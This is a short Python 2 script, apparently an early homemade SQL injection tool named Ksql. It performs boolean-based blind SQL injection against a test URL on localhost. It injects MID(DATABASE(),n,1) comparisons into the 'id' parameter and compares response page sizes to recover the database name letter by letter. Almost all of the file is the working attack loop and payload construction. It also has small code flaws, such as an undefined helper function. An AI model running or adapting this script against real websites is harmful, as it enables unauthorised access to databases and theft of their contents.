#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
	author:		kaysen - http://www.xujiantao.com
	version:	Ksql 1.0
"""

import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet, filecmp, json
from difflib import *

reload(sys)
#sys.setdefaultencoding('utf-8')
sys.setdefaultencoding('utf8')

def modulePath():
    """
    This will get us the program's directory, even if we are frozen
    using py2exe
    """

    try:
        _ = sys.executable if weAreFrozen() else __file__
    except NameError:
        _ = inspect.getsourcefile(modulePath)

    return os.path.dirname(os.path.realpath(_))

	
def htmlDecode(string):

	tmpHtmlaEncode = None
	try:
		pageInfo = chardet.detect(string)

		tmpHtmlEncode = string.decode(pageInfo['encoding'])
		
		#获取系统编码
		currentSystemEncoding = sys.getfilesystemencoding()
		
		tmpHtmlEncode = tmpHtmlEncode.encode(currentSystemEncoding)
		
	except Exception as e:
		print "错误：在处理网页编码时遇到问题：" + str(e)
		return
		
	return tmpHtmlEncode
	
	
SQLMAP_ROOT_PATH = modulePath()
KSQL_XML_PATH = os.path.join(SQLMAP_ROOT_PATH, "xml")
QUERIES_XML = os.path.join(KSQL_XML_PATH, "queries.xml")

ITOA64 = "abcdefghijklmnopqrstuvwxyz"

url = 'http://localhost/test/test.php?id=1&name=kaysen'

if os.path.exists('database.log'):
	os.remove('database.log')


'''
	暂时先只处理一个参数
'''
values = url.split('?')[-1]
host = url.split('?')[0]
tmpUrl = ''
for key_value in values.split('&'):
	val = key_value.split('=')
	tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
	
	break


''' Blind SQL Injection '''
# 成功的页面大小数
succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
print succPageSize
for num in range(1, 5):

	for word in ITOA64:
	
		newUrl = tmpUrl
		newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
	
		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
		
		print newUrl
		
		
		if succPageSize == currPageSize:
			file_object = open('database.log', 'a')
			file_object.write(word)
			file_object.close()
			print word
			break

		time.sleep(0.1)
		

file_object = open('database.log', 'r')
try:
     all_the_text = file_object.read()
finally:
     file_object.close()

print 'database: ',all_the_text